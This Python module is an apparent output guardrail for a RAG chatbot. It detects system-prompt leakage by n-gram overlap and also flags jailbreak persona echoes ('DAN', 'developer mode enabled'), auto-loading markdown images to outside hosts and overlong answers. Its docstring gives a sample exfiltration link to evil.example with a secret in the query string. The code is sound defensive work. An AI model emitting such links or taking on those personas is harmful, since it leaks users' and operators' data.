"""Unsafe-output detection.

The output guardrail assumes the model **may already have been subverted**.
Every other control tries to prevent that; this one asks what would be visible
if prevention failed, and looks for exactly those traces:

* **System-prompt leakage** -- the answer reproducing distinctive spans of the
  system prompt.  Detected by n-gram containment against the actual prompt
  text, so it survives paraphrase-free reproduction, translation of layout, and
  partial quoting.  This is the single most useful signal that an extraction
  attempt succeeded.
* **Instruction echo** -- the answer adopting the injected persona or
  announcing that it has new rules.
* **Rendered-link exfiltration** -- a markdown image or link pointing at an
  external host with data in the query string.  A model can be induced to emit
  ``![](https://evil.example/?d=<secret>)``; when the frontend renders it, the
  browser makes the request and the data leaves.  This is why the answer is
  scanned for outbound URLs even though the *server* never fetches them.
* **Structural anomalies** -- an answer far longer than any question warrants,
  which is what a "dump everything you know" success looks like.

Findings are advisory scores, combined by the output pipeline, not independent
hard blocks -- with one exception: prompt leakage above a high threshold is
always fatal, because there is no benign reading of it.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from app.rag.prompts.templates import SYSTEM_PROMPT
from app.rag.retrieval.keyword import tokenize

# Markdown image/link with an absolute URL. The `!` form is the dangerous one --
# it loads without a click -- but both are reported.
_MARKDOWN_URL = re.compile(r"(!?)\[[^\]]*\]\(\s*(https?://[^)\s]+)")
_BARE_URL = re.compile(r"https?://[^\s<>\"')\]]+")
# A URL carrying a long opaque value is exfiltration-shaped.
_LONG_QUERY_VALUE = re.compile(r"[?&][^=&]+=([^&\s]{40,})")

_INSTRUCTION_ECHO = re.compile(
    r"\b(?:my\s+(?:system\s+)?(?:prompt|instructions?|rules?)\s+(?:are|is|say)|"
    r"i\s+(?:have\s+been|was)\s+(?:instructed|told|configured)\s+to|"
    r"i\s+am\s+now\s+(?:an?\s+)?(?:unrestricted|unfiltered|uncensored|DAN)|"
    r"as\s+(?:DAN|an\s+unrestricted\s+ai)|"
    r"developer\s+mode\s+(?:enabled|activated)|"
    r"my\s+new\s+(?:instructions?|rules?|task)\s+(?:are|is))\b",
    re.IGNORECASE,
)

# Distinctive spans of the system prompt, used for leakage detection.
_LEAK_NGRAM_SIZE = 5
_PROMPT_NGRAMS: set[tuple[str, ...]] | None = None

# Above this share of overlapping n-grams, the answer is reproducing the prompt.
LEAK_FATAL_THRESHOLD = 0.12
LEAK_SUSPICIOUS_THRESHOLD = 0.05

MAX_REASONABLE_ANSWER_CHARS = 8000


def _prompt_ngrams() -> set[tuple[str, ...]]:
    global _PROMPT_NGRAMS
    if _PROMPT_NGRAMS is None:
        tokens = tokenize(SYSTEM_PROMPT)
        _PROMPT_NGRAMS = {
            tuple(tokens[i : i + _LEAK_NGRAM_SIZE])
            for i in range(max(0, len(tokens) - _LEAK_NGRAM_SIZE + 1))
        }
    return _PROMPT_NGRAMS


@dataclass
class SafetyFinding:
    name: str
    severity: float
    detail: str = ""


@dataclass
class SafetyReport:
    findings: list[SafetyFinding] = field(default_factory=list)
    prompt_leak_ratio: float = 0.0
    external_urls: list[str] = field(default_factory=list)
    fatal: bool = False

    @property
    def risk_score(self) -> float:
        return max((f.severity for f in self.findings), default=0.0)

    @property
    def is_unsafe(self) -> bool:
        return self.fatal or self.risk_score >= 0.6

    def as_detail(self) -> dict:
        return {
            "findings": [
                {"name": f.name, "severity": f.severity, "detail": f.detail}
                for f in self.findings
            ],
            "prompt_leak_ratio": round(self.prompt_leak_ratio, 4),
            "external_url_count": len(self.external_urls),
            "fatal": self.fatal,
        }


def detect_prompt_leakage(answer: str) -> float:
    """Share of the answer's 5-grams that also appear in the system prompt."""
    tokens = tokenize(answer)
    if len(tokens) < _LEAK_NGRAM_SIZE:
        return 0.0
    answer_ngrams = {
        tuple(tokens[i : i + _LEAK_NGRAM_SIZE])
        for i in range(len(tokens) - _LEAK_NGRAM_SIZE + 1)
    }
    if not answer_ngrams:
        return 0.0
    shared = answer_ngrams & _prompt_ngrams()
    return len(shared) / len(answer_ngrams)


def check_output_safety(answer: str) -> SafetyReport:
    """Inspect a generated answer for evidence of a successful attack."""
    report = SafetyReport()
    if not answer:
        return report

    leak_ratio = detect_prompt_leakage(answer)
    report.prompt_leak_ratio = leak_ratio
    if leak_ratio >= LEAK_FATAL_THRESHOLD:
        report.fatal = True
        report.findings.append(
            SafetyFinding(
                "system_prompt_leak",
                1.0,
                f"{leak_ratio:.0%} of the answer matches the system prompt",
            )
        )
    elif leak_ratio >= LEAK_SUSPICIOUS_THRESHOLD:
        report.findings.append(
            SafetyFinding(
                "partial_prompt_leak",
                0.6,
                f"{leak_ratio:.0%} overlap with the system prompt",
            )
        )

    if _INSTRUCTION_ECHO.search(answer):
        report.findings.append(
            SafetyFinding(
                "instruction_echo",
                0.85,
                "answer describes its own instructions or an assumed persona",
            )
        )

    markdown_urls = _MARKDOWN_URL.findall(answer)
    bare_urls = _BARE_URL.findall(answer)
    report.external_urls = sorted({url for _bang, url in markdown_urls} | set(bare_urls))

    auto_loading = [url for bang, url in markdown_urls if bang == "!"]
    if auto_loading:
        report.findings.append(
            SafetyFinding(
                "auto_loading_external_image",
                0.9,
                f"{len(auto_loading)} markdown image(s) pointing at external hosts",
            )
        )

    if any(_LONG_QUERY_VALUE.search(url) for url in report.external_urls):
        report.fatal = True
        report.findings.append(
            SafetyFinding(
                "url_with_embedded_payload",
                1.0,
                "an external URL carries a long opaque query value",
            )
        )

    if len(answer) > MAX_REASONABLE_ANSWER_CHARS:
        report.findings.append(
            SafetyFinding(
                "excessive_length",
                0.5,
                f"answer is {len(answer)} characters",
            )
        )

    return report
